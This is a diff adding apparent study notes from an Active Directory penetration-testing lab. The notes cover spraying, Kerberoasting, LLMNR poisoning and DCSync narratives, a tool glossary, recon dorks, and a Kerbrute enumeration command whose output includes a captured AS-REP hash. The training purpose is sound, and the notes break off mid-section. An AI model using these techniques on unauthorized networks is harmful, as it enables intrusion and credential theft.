@@ -1,0 +1,1704 @@
+Active directory is a directory service for Windows enterprise environments that was officially implemented in 2000.Active Directory is based on protocols x.500 and LDAP(Lightweight Directory Access Protocol.) It is a distributed, hierarchical structure that allows centralized management of an organization's resources, including users, computers, groups, network devices and file , group policies, devices, and trusts. AD provides authentication, authorization and accounting.
+
+Active Directory is important because Microsoft Active Directory holds around 43% of the market share for enterprise organizations utilizing Identity and Access management solutions,
+There have also been a huge number of vulnerabilities discovered regarding AD in the past years so the threat is present. We practice enumerating AD with different tools such as Sysinternals, WMI,  DNS, and others. Some attacks will include the usage of tools like Responder, Kerbrute, Bloodhound and more.
+
+General hold is getting foothold in and Active Directory environment and moving laterally or vertically and escalating privileges until we accomplish intended goal or reach certain position.
+
+Here we can use our tools but we also need to be comfortable enumerating and attacking AD with limited set of tools or built in Windows tools known as "living of the land".
+
+**Real-World examples (important- learn from this)**
+
+First example:
+
+***During this engagement, I compromised a single host and gained `SYSTEM` level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were `Service Principal Names` (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the `NetNTLMv2 hash` of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.***
+
+
+Second example:
+
+***Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) tool and retrieved both a listing of `all` users from the domain, and the domain `password policy`. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, `Password1`, Password123, `Spring2018`, etc. but did not get any hits. Finally, I made an attempt with `Spring@18` and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a `pass-the-ticket` attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.***
+
+Third example:
+
+***I had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the [linkedin2username](https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the `userenum` feature of Kerbrute, ended up with 516 valid users. I knew I had to tread carefully with password spraying, so I tried with the password `Welcome2021` and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all) rights over the [Enterprise Key Admins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.***
+
+
+
+**Tools that will be used (important to add to the tool section in mintfly)**
+
+***PowerView/SharpView*** - A Powershell tool and a .NET port at the same time that is used to gain situational awareness in the AD environment. PowerView and SharpView can help us gather much of the data that BloodHound does but it requires more work to make meaningful relationships among all of the data points. These tools are a great way to see what additional access we may have with a new set of credentials, targeting specific users and computers, or finding "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.
+
+***Bloodhound*** - This tool is uset to visually map out AD environment and relationships and help to plan attack paths that may otherwise go unnoticed. It uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with the Neo4j database for graphical analysis of the AD environment.
+
+***SharpHound*** - This is the C# tool that is used for data collection to gather information from Active Directory about varying AD objects such as users, computers, groups, ACLs, GPOs, user and computer attributes, user sessions, and much more. It produces JSON files that are then ingested into the BloodHound GUI  tool for further analysis.
+
+***BloodHound.py*** - This is a python based BloodHound ingestor based on the Impacet toolkit. It supports most BloodHound collection methods and can be run from the non-domain joined attack host. Later on, gathered data, can be ingested into BloodHound GUI for further analysis.
+
+***Kerbrute*** - This is a tool written in Go that uses Kerberos pre-authentication to enumerate AD users, perform password-spraying and brute-forcing.
+
+***Impacket-toolkit*** - This is a collection of tools that is written in Python for interacting with network protocols and it contains a lot of scripts that can be used for enumeration and attacking of AD.
+
+***Responder*** - Responder is a purpose-build tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
+
+***Inveigh.ps1*** - This is a tool that is similar to Responder. It is a PowerShell tool used for performing various network spoofing an poisoning attacks.
+
+***C# Inveigh*** - The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.
+
+***rpcinfo*** - The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.
+
+***rpcclient*** - A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.
+
+***CrackMapExec(CME)*** - CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.
+
+***Rubeus*** - This is a C# tool built for Kerberos abuse.
+
+***GetUserSPNs.py*** - Another Impacket module geared towards finding Service Principal names tied to normal users.
+
+***Hashcat*** - tool for cracking and password recovery.
+
+***enum4linux*** - a tool for enumerating information from Windows and Samba systems.
+
+***enum4linux-ng*** - a rework of the enum4linux tool that works a bit defferently.
+
+***ldapsearch*** - built-in interface for interacting with LDAP protocol.
+
+***windapserach*** - a python script that is used for enumeration AD users, groups and computers using LDAP queries. Useful for automating custom LDAP queries.
+
+***DomainPasswordSpray.ps1*** - DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of the domain.
+
+***LAPSToolkit*** - The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).
+
+***smbmap*** -smb share enumeration across a domain.
+
+***psexec.py*** - Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.
+
+***wmiexec.py*** - Part of the Impacket toolkit, it provides the capability of command execution over WMI.
+
+***snaffler*** - useful tool for finding information (such as credentials) in Active Directory anon computers with accessible file shares.
+
+***smbserver.py*** - Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.
+
+***setspn.exe*** - Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.
+
+***Mimikatz*** - Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.
+
+***secretsdump.py*** - Remotely dump SAM and LSA secrets from a host.
+
+***evil-winrm*** - Provides us with an interactive shell on a host over the WinRM protocol.
+
+***mssqlclient.py*** - Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.
+
+***noPac.py*** - Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.
+
+***rpcdump.py*** - Part of the Impacket toolset, RPC endpoint mapper.
+
+***ntlmrelayx.py*** - Part of the Impacket toolset, it performs SMB relay attacks.
+
+***PetitPotam.py*** - PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
+
+***gettgtpkinit.py*** - Tool for manipulating certificates and TGTs.
+
+***getnthash.py*** - This tool will use an existing TGT to request a PAC for the current user using U2U.
+
+***adidnsdump*** - A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.
+
+***gpp-decrypt*** - Extracts usernames and passwords from Group Policy preferences files.
+
+***GetNPUsers.py*** - Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.
+
+***lookupsid.py*** - SID bruteforcing tool.
+
+***ticketer.py*** - A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.
+
+***raiseChild.py*** - Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.
+
+***Active Directory Explorer*** - Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.
+
+***PingCastle*** - Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).
+
+***Group3r*** - Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).
+
+***ADRecon*** - A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
+
+
+
+
+
+**External Recon**
+
+***Why***
+
+We can think of this as the lay of the land to insure that we provide the most comperhensive test possible for our customer. We identify leaks of any important documentation or credentials. This can be as simple as gleaning a username format from the customers main website or social media.
+
+***What*** we should be looking for is:
+
+ID Space - Valid ASN, netblocks, cloud presence, DNS records, etc.
+
+Domain Information - Based on IP data, DNS, and site registrations. Who administers the domain= Any subdomains? Publicly accessible domain services? (Mailservers, DNS, Websites, VPN Portals, etc.), Can we confirm what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)
+
+Schema Format - Can we discover organization's email account, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.
+
+Data disclosures - Any publicly accesible files like .pdf, .ppt, etc. Metadata or shares and other critical software and hardware in environmaent are also important.
+
+Breach Data - Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.
+
+
+***Where***
+
+ASN/IP registrars - IANA,arin for searching the Americas, RIPE for searching in Europe, BGP Toolkit
+
+Domain Registrars & DNS - Domaintools, PTRArchive, ICANN, manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8
+
+Social media - Searching Linkedin, Instagram, Facebook, Twitter and other major social media sites, news articles, and any relevant info we can find about the organization
+
+Public-Facing Company Websites - Often, the public website for corporation will have relevant info embedded. News articles, embedded documents, and the "About us" section of the page or pages themselves.
+
+Cloud & Dev Storage Spaces - GitHub, AWS S3 Buckets & Azure Blog storage containers, Google searches using "Dorks"
+
+Breach Data sources - HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords agains any exposed login portals that may use AD authentication.
+
+
+
+BGP-Toolkit - Good for searching what address blocks are assigned to an organization and what ASN they reside within.
+
+For DNS lookup interesting sites like domaintools and viewDNS.info are great spots. we may sometimes find additional hosts outside the scope that look interestiong. We should look that up with our client. We may also find interestiong subdomains that were not listed in scoping document, but reside on in-scope IP addresses and therefore are fair game.
+
+
+in bgp-toolkit we can se some information for inlanefreight.com about the IP address, Mail Exchanger and also TXT records. in viewDNS.info we can also see a lot of stuff including subdomains. If we search filetype:pdf inurl:inlanefreight.com, we can see pdf files related to inlanefreight.com site. there we found pdf file. we can also search for mail addresses like this:
+intext:"@inlanefreight.com" inurl:inlanefreight.com. there we found contact page with a list of emails for users. we can think of them still active. now we have naming convection for emails. we can later use this on for brute forcing or password spraying.
+
+We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.
+
+#### Credential Hunting
+
+[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.
+
+
+For our initial enumeration on this module, we are it seems doing internal enumeration. This can be done a lot of ways but for us to actually enumerate internally (as agreed in the scope of the testing that our client specified) we need to have access to inside of the network.
+
+This can be done multiple ways:
+
+1. A penetration testing distro (typically Linux) as a virtual machine in their infrastructure that calls back to a jump host we control over the VPN, and we can SSH into.
+2. A physical device plugged into an ethernet port that calls back to us over VPN
+3. A physical presence in their office with our laptop plugged into their ethernet port
+4. A Linux VM in either Azure or AWS with access to the internal network what we can SSH into using public key authentication and our publiv IP address whitelisted.
+5. VPN accesss into their internal network
+6. From a corporate laptop connected to the clients VPN
+7. On a managed workstation physically sitting in their office with limited or no internet access or ability to pull in tools. They might also  allow internet usage and to pull in tools.
+8. On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the manged workstation typically accesible over VPN either remotely or from a corporate laptop.
+
+**Key Data Points!!!**
+
+1. AD Users - We are trying to enumerate valid user accounts we can target for password spraying
+2.  AD Joined Computers - Key computers that we target include Domain Controllers, file servers, SQL servers, Mail Exchange servers, database servers, etc.
+3. Key services - Kerberos, NetBIOS, LDAP, DNS,...
+4. Vulnerable Hosts and Services - Anything that can be a quick win (a.k.a an easy host to exploit and gain a foothold)
+
+Enumerating AD is hard without planning. Methodology important!!! 
+
+No matter how we proceed we typically start at the same place and look for the same data points. 
+
+Passive indentification and active validation of the results. Afterwards we probe. Afterwards we stop, group and anaylize what we got. Hopefully credentials or user account.
+
+**Tools and techniques**
+
+We can use Wireshark or TCPDump to inspect network and intercept packets and analyse them. this is especially helpful in black box approach.
+
+It is usefull to save what we scan with wireshark and tcpdump (PCAP traffic). if we cannot transfer tools for example to windows, we already have installed network monitoring tool known as pktmon.exe which is installed to all editions of windows 10.
+
+It should be noted that I connected to their linux VM with xfreerdp and there used wireshark and other tools.
+
+We use **Responder** to analyse network traffic.
+
+It is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses.
+
+Here we can find some hosts that we did not find with wireshark and it is worth it to note them down.
+
+active checks we can perform with **fping**.
+
+it provides similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with the host. it shines in its ability to send requests to mulitple hosts at once. it runs in cyclical manner instead of waiting. this is not one-stop-shop but it will tell as an inital idea of what exists.
+
+fping flags:
+1. a - to show targets that are alive
+2. s - to print stats at the end of the scan
+3. g - to generate a target list from the CIDR network
+4. q - to not show per-target results
+
+example:
+
+```bash
+fping -asqg 172.16.5.0/23
+```
+
+Next we can proceed to **nmap scanning** for more detailed scan of the alive targets for active services and their ports. We want to identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts to probe later.
+
+In AD it would be nice to focus on accompanying AD services such as ***DNS,SMB,LDAP, and Kerberos***
+
+example of the scan:
+
+```bash
+sudo nmap -sS -v -A 172.16.5.5 172.16.5.130 -oN /home/htb-student/Documents/hosts-enum
+```
+
+this uses stealth, v prints steps, -A stands for aggresive and -oN outputs normal text to read by human.
+
+it is good practice here to look for older software that some large enterprise environments still use so we can exploit them easily.
+
+we need to be aware how our tools work. nmap could cause instability in the system or take it offline which can cause issues. we need to understand the scans we take. 
+
+**Identifying Users**
+
+So, if our client does not give us a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining credentials or NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or shell in the context of a domain user-account.
+
+The access, even the lower one, offers a lot of opportunities.
+
+***Kerbrute - Internal AD Username Enumeration***
+
+As the title says, kerbrute is a tool for username enumeration among other things. It is considered a stealthier option for domain account enumeration since it takes advantage of Kerberos pre-authentication not triggering logs or alerts. We use Kerbrute in conjuction with wordlists that contain usernames. In this section I used jsmith.txt or jsmith2.txt from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). 
+
+We then point Kerbrute at Domain Controller we found earlier and feed it a wordlist.
+
+for example:
+
+```bash
+htb-student@ea-attack01]─[~]
+└──╼ $kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 07/21/26 - Ronnie Flathers @ropnop
+
+2026/07/21 08:49:17 >  Using KDC(s):
+2026/07/21 08:49:17 >   172.16.5.5:88
+
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:17 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:e4546b6938e4d52567482d2ee39ff9a4$ff2824b5638c0efcf9c5d2521f8f3e834339ca0ede1c1cbb43a870e2a4016249547116f5cb6efbe7dafe6ed9494782c7e598940ed23ed69db4ae3f5273cffdc42ac7f10ab9b198b9761c12213a7f7f364399383a13bfefa01e78ac125c41729ecc53589eda6f767967d9c87c2aef95efd4149a5d925dfa0a8ce4fd4725ed96a7687d142b8959956ce9e2129464c3a102d05a7bddec9ce90970ccf7b79860d8f794c93c106e8704919dc414886c5a02456f0ff501f173ec1b2657a2edd74bb581187004a3bff0d40542f9ec482789961e4154b1374a16db7153e1eb3c648b9c6483ee4337fca6acc9d35bbbfbcb643400f45f1636637c35353e48be50655a898c9ce754e5756a687a7eeb                                                           
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       gdavis@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mrichardson@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       mharrison@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       tgarcia@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jmay@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jmontgomery@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:18 >  [+] VALID USERNAME:       jhopkins@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       dpayne@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       mhicks@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       adunn@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       lmatthews@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       avazquez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       mlowe@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       jmcdaniel@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:19 >  [+] VALID USERNAME:       csteele@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:20 >  [+] VALID USERNAME:       mmullins@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:21 >  [+] VALID USERNAME:       mochoa@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:21 >  [+] VALID USERNAME:       aslater@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       ehoffman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       ehamilton@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:22 >  [+] VALID USERNAME:       cpennington@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:23 >  [+] VALID USERNAME:       srosario@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:23 >  [+] VALID USERNAME:       lbradford@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       halvarez@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       gmccarthy@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:24 >  [+] VALID USERNAME:       dbranch@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:25 >  [+] VALID USERNAME:       mshoemaker@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       mholliday@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       ngriffith@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       sinman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       minman@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:26 >  [+] VALID USERNAME:       rhester@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:27 >  [+] VALID USERNAME:       rburrows@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:28 >  [+] VALID USERNAME:       dpalacios@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:29 >  [+] VALID USERNAME:       strent@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       fanthony@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:30 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:32 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:34 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
+2026/07/21 08:49:35 >  Done! Tested 48705 usernames (56 valid) in 17.512 seconds
+```
+
+we can see here command and result. parameters for kerbrute we can see if we just type kerbrute and press enter.
+
+we see 56 valid usernames and even hash of mmorgan since he has no pre auth required. we can then crack the hash with hashcat or use it with pass the hash attack.
+
+for this example as-rep was used with etype 23 which is 18200 in hashcat.
+
+
+**Identifying potential vulnerabilities**
+
+the local system account **NT AUTHORITY\SYSTEM** is a built-in account in Windows  operating systems. It has the highest level of access in the OS  and is used to run most Windows services.
+
+A `SYSTEM` account on a `domain-joined` host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.
+
+there are multiple ways to gain system level access on a host:
+1. remote windows exploits such as eternalblue
+2. abusing service that is running in the context of SYSTEM account, or abusing the service account SeImpersonate privileges using JuicyPotato.
+3. Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheaduler 0-day
+4. Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window
+
+By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:
+
+- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
+- Perform Kerberoasting / ASREPRoasting attacks within the same domain.
+- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
+- Perform token impersonation to hijack a privileged domain user account.
+- Carry out ACL attacks.
+
+we need to be cautious when performing these active tasks against AD environment to not get caught. If we are performing evasive scanning then it is okay but if not then we have to be stealthy and mimic real world attackers.
+
+**LLMNR/NBT-NS Poisoning - from Linux**
+
+
+We will work through two different techniques side by side: network poisoning and password spraying. We want to acquire cleartext credentials for domain account thereby gaining us a foothold in the domain.
+
+We will perform man-in-the-middle attack on Linked-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, we may get low-privileged or administrative level password hashes that can also sometimes be used to perform SMB relay attacks.
+
+***LLMNR & NBT-NS Primer***
+
+They are used if DNS fails for host identification. If DNS fails for some reason then LLMNR is used and it asks all machines on the local network for the correct host address. LLMNR is based upon the Domain Name System (DNS) and allows the hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP. If LLMNR fails then NBT-NS will be used. It identifies systems on a local network by their NetBIOS name. It utilizes port 137 over UDP.
+
+The thing is, when LLMNR and NBT-NS are used for name resolution, ANY host on the  network can reply. This is where we come in with the Responder and poison these requests. We can poison the authoritative name resolution source in the broadcast domain by responding to LLMNR nad NBT-NS traffic as if they have the answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending we know about the requested host. If the requested host requires authentication then we capture NetNTLM hash and crack it offline or use it for pass the hash attacks. We can then use it against different protocols such as LDAP.
+
+Example for LLMNR/NBT-NS poisoning.
+
+1. Let's say the host is attempting to connect to \\print1.inlanefreight.local but accidentally types in \\printer1@inlanefreight.local 
+2. DNS server responds with not knowing this host
+3. Then host broadcasts request to the entire network asking if anyone knows this host and its location (\\printer1@inlanefreight.local)
+4. We (the attacker with Responder) respond to the host stating that we are the \\printer1@inlanefreight.local
+5. The host believes us and sends username and NTLMv2 password hash to authenticate
+6. We then crack the NTMLv2 hash online and use it elsewhere.
+
+Several tools can be used for this purpose:
+1. Responder
+2. Inveigh
+3. Metasploit
+
+Responder is written in Python and typically used on a Linux host, while Inveigh is written in C# and PowerShell. Responder also has a .exe version that works on Windows. Both can attack:
+
+* LLMNR
+* NBT-NS
+* MDNS
+* DNS
+* DHCP
+* ICMP
+* HTTP
+* HTTPS
+* SMB
+* LDAP
+* WebDAV
+* Proxy Auth
+
+Responder also has support for:
+* POP3
+* MSSQL
+* DCE-RPC
+* FTP
+* IMAP
+* SMTP auth
+
+We can see Responder options if we type:
+
+```bash
+responder -h
+```
+
+there are some interesting options:
+
+flag -A puts us in Analyze mode so there is no poisoning just NBT-NS, LLMNR, MDNS requests in environment.
+
+We must always supply either interface or an ip address. 
+
+We may typically also commonly use -wf option. -w is for starting WPAD rouge proxy server, and -f is for attempting to fingerprint the  remote host.
+
+we can use -v for increased verbosity
+
+also we can use -F or -P to force NTLM/Basic or proxy authentication but it may cause a login prompt.
+
+-w flag utilizes the built-in WPAD proxy server and this can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.
+
+With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled. For example, a log file may look like `SMB-NTLMv2-SSP-172.16.5.25`. Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.
+
+we must run responder with sudo.
+
+
+On the windows we can run Inveigh
+
+It is a tool written in PowerShell and C#. PowerShell one is no longer updated. It works on the same principle.
+
+how to check if target is vulnerable to LLMNR and NBT-NS:
+Based on the module content, here are a few ways to check for this vulnerability:
+
+### 1. Active Poisoning (The Attacker's Method)
+
+The most direct way to test for vulnerability is to attempt the attack itself in a controlled manner. As demonstrated in this section and the previous one, you can use a tool to listen for LLMNR and NBT-NS queries.
+
